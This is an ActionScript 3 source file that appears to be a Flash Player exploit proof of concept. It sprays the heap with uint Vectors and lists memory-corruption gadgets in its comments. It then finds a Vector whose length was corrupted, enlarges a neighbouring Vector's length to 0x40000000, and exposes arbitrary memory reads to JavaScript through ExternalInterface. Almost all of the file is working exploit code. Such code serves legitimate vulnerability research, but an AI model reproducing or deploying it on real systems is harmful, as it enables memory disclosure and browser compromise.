package
{    
	import flash.display.*;
	import flash.text.*;
	import flash.system.*;
	import flash.geom.*;
	import flash.external.*;
	import flash.events.*;
	import flash.system.ApplicationDomain;
	
	public class Main extends Sprite
	{
		private var spray:Array
		private var offset:uint = 0x1abc0000;
		private var index:uint = 0;
		private var temp:uint = 0;
		private var size:uint = 100000;
		public function AsSpray():void
		{
			var alignment:uint = 0x1000;
			spray = new Array();
			for(index = 0; index < size; index++)
			{
				spray[index] = new Vector.<uint>((alignment-0x8)/0x4);
				spray[index][0]=0xAAAAAAAA;
				spray[index][1]=0xBBBBBBBB;
				spray[index][2]=0xCCCCCCCC;
				spray[index][3]=0xDDDDDDDD;
			}
			/*
			possible memory corruption gadgets
			or [r32],xxx (useful)
			and [r32],xxx (useless for this method)
			add [r32],xxx (useful)
			sub [r32],xxx (useful)
			xor [r32],xxx (useful)
			mov [r32],xxx (useful)
			inc [r32] (useful)
			dec[r32] (useful)
			*/
			
			// if gadget is not sub or dec comment out below code
			for(index = 0; index < size; index++)
			{
				spray[index].length = 0;
			}
			// if gadget is not sub or dec comment out above code
		}
		public function readAddr(address:uint):uint
		{
			//0th index points to "private var offset" + 0x8
			//Note: address will be aligned by 4byte boundary, to read non 4byte aligned address merge 1DWORD backward and 1 DWORD forward
			
			if(address>=(offset+8))
				return spray[index][(address-offset-0x8)/4];
			else
				return spray[index][0x3ffffffe - offset/4 + address/4];
		}
		public function postLeak(address:uint):void
		{
			ExternalInterface.call("check","@ address 0x"+address.toString(16).toUpperCase()+" 0x"+readAddr(address).toString(16).toUpperCase());
		}
		
		public function Leak():void
		{
			var temp:uint = 0;
			// Check which object was corrupted
			// for POC purpose size of object corrupted is 0xFFFFFFFF from a dec[r32] gadget memory corruption.
			// before clicking ClickMe edit size of any vector object (preferably at *offset*) to 0xFFFFFFFF)
			
			for(index = 0; index < size; index++)
			{
				if(spray[index].length > 0x3fe)
				{
					//in case of any form of corruption length inc will be greater than equal to 0x1 except corruption by AND instruction.
					//save the next object's length
					temp=spray[index][0x3fe];
					
					//mark next vector's 1st byte 0x40000000
					spray[index][0x3fe]=0x40000000;
					
					//use the next vector to corrupt current object
					spray[index+1][0x3ffffffe-0x1000/4]=0x40000000;
					
					//restore the next vector to its original value
					spray[index+1][0x3ffffffe]=temp;
					
					ExternalInterface.call("check","Corrupted pointer size = 0x" + spray[index][0x3ffffffe].toString(16).toUpperCase());
					break;
				}
			}
			// Size of array is 0x40000000 DWORDs which are capable of reading full memory
		}
		public function Main():void
		{
			AsSpray();
			ExternalInterface.call("check","Vector Spray done");
			ExternalInterface.addCallback("Corruption",Leak);
			ExternalInterface.addCallback("Information",postLeak);
		}
	}
}	
